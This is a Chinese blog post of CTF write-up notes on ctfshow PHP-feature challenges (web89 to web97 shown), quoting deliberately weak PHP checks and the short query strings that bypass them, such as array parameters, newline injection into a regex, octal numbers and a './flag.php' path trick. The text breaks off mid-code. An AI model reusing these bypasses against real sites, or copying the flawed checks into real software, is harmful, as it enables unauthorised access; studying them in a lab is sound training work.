<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="PHP特性篇 web89-web120web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&amp;q">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow-web入门笔记-PHP特性-前半部分">
<meta property="og:url" content="http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/index.html">
<meta property="og:site_name" content="ShuiChang厕纸博客站">
<meta property="og:description" content="PHP特性篇 web89-web120web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&amp;q">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-02-13T10:14:00.000Z">
<meta property="article:modified_time" content="2024-02-13T10:20:32.626Z">
<meta property="article:author" content="ShuiChang">
<meta property="article:tag" content="web学习">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ctfshow-web入门笔记-PHP特性-前半部分</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%90%8E%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&text=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&is_video=false&description=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-PHP特性-前半部分&body=Check out this article: http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&name=ctfshow-web入门笔记-PHP特性-前半部分&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&t=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7%E7%AF%87-web89-web120"><span class="toc-number">1.</span> <span class="toc-text">PHP特性篇 web89-web120</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web89"><span class="toc-number">1.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web90"><span class="toc-number">1.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web91"><span class="toc-number">1.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web92"><span class="toc-number">1.4.</span> <span class="toc-text">web92</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web93"><span class="toc-number">1.5.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web94"><span class="toc-number">1.6.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web95"><span class="toc-number">1.7.</span> <span class="toc-text">web95</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web96"><span class="toc-number">1.8.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web97"><span class="toc-number">1.9.</span> <span class="toc-text">web97</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web98"><span class="toc-number">1.10.</span> <span class="toc-text">web98</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web99"><span class="toc-number">1.11.</span> <span class="toc-text">web99</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web100"><span class="toc-number">1.12.</span> <span class="toc-text">web100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web101"><span class="toc-number">1.13.</span> <span class="toc-text">web101</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web102"><span class="toc-number">1.14.</span> <span class="toc-text">web102</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web103"><span class="toc-number">1.15.</span> <span class="toc-text">web103</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web104"><span class="toc-number">1.16.</span> <span class="toc-text">web104</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web105"><span class="toc-number">1.17.</span> <span class="toc-text">web105</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web106"><span class="toc-number">1.18.</span> <span class="toc-text">web106</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web107"><span class="toc-number">1.19.</span> <span class="toc-text">web107</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web108"><span class="toc-number">1.20.</span> <span class="toc-text">web108</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web109"><span class="toc-number">2.</span> <span class="toc-text">web109</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web110"><span class="toc-number">3.</span> <span class="toc-text">web110</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web111"><span class="toc-number">3.1.</span> <span class="toc-text">web111</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web112"><span class="toc-number">3.2.</span> <span class="toc-text">web112</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web113"><span class="toc-number">3.3.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web114"><span class="toc-number">3.4.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web115"><span class="toc-number">3.5.</span> <span class="toc-text">web115</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web116"><span class="toc-number">3.6.</span> <span class="toc-text">web116</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web117"><span class="toc-number">3.7.</span> <span class="toc-text">web117</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118"><span class="toc-number">3.8.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119"><span class="toc-number">3.9.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120"><span class="toc-number">3.10.</span> <span class="toc-text">web120</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ctfshow-web入门笔记-PHP特性-前半部分
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ShuiChang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-02-13T10:14:00.000Z" class="dt-published" itemprop="datePublished">2024-02-13</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="PHP特性篇-web89-web120"><a href="#PHP特性篇-web89-web120" class="headerlink" title="PHP特性篇 web89-web120"></a>PHP特性篇 web89-web120</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计代码，需要get传入一个num参数，然后后面过一个intval的判断。preg_match函数传入的变量是数组的时候会报错并返回0；而intval函数传入的变量是数组的时候会返回1，所以只需要传入数组就行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=a</span><br></pre></td></tr></table></figure>

<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>intval()的绕过。intval()接受两个参数，一个参数是要转换为整型的变量，另一个是指定转换的基数，比如转换为x进制。一些典型的输出是这样的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 10000000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为接受的是一个字符串，所以直接输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=4476a</span><br><span class="line">?num=+4476</span><br></pre></td></tr></table></figure>
<p>总之就是4476的各种变形即可</p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码，应该是考PHP正则表达式的，php正则表达式的flag有以下几种</p>
<p>i	执行不区分大小写的搜索<br>m	执行多行搜索（搜索字符串开头或结尾的模式将匹配每行的开头或结尾）<br>u	启用 UTF-8 编码模式的正确匹配</p>
<p>&#x2F;^php$&#x2F;im 表示将匹配以 “php” 开头和结尾的字符串，不区分大小写，且可以跨越多行。^表示匹配字符串开头，$表示匹配字符串末尾，i表示不区分大小写，m表示跨越多行。</p>
<p>这样就很好绕过了，第二个preg_match()中的正则表达式没有m，那么就直接把php放在第二行即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=nihao%0Aphp</span><br></pre></td></tr></table></figure>


<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>直接转16进制即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br></pre></td></tr></table></figure>

<p>一个<a target="_blank" rel="noopener" href="https://ctf.show/writeups/706665">wp</a>这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval($num,0)==4476根据num的格式来决定使用的进制，这里可以使用16进制。0x117c</span><br></pre></td></tr></table></figure>

<p>也可以使用科学计数法绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</span><br></pre></td></tr></table></figure>

<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>限制了不能用字母。但是，可以用其他进制绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二进制： 0b????</span><br><span class="line">八进制： 0????</span><br><span class="line">十六进制： 0x????</span><br></pre></td></tr></table></figure>
<p>八进制不含字母，就可以绕过了。</p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>限制了不能通过进制转换，而且开头不能有0，但是必须要有0。那还能通过小数点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>strpos() 是 PHP 函数，它返回字符串中第一次出现子字符串的位置。该函数接受两个参数：要搜索的字符串和要搜索的子字符串。如果未找到子字符串，则 strpos() 返回 false。如果在字符串开头找到子字符串，则 strpos() 返回 0，在某些上下文中可以解释为 false </p>
</blockquote>
<blockquote>
<p>对 $pos &#x3D; strpos($num, “0”); 这段代码来说，如果在 $num 中未找到子字符串 “0”，则 $pos 将为 false。如果 “0” 在 $num 的开头找到，则 $pos 将为 0。否则，$pos 将是 $num 中第一次出现 “0” 的位置</p>
</blockquote>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比起上一道题，这道题的第一个比较用了弱比较，而且后面的正则还加了个小数点，就无法用4476.0绕过了。因为strpos在这里只是检查第一个字符是不是0，所以可以加一个+，然后用八进制绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=+010574</span><br></pre></td></tr></table></figure>

<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码，需要get传一个u参数，该参数不能是flag.php这个字符串。那就直接传?u&#x3D;.&#x2F;flag.php即可。</p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span 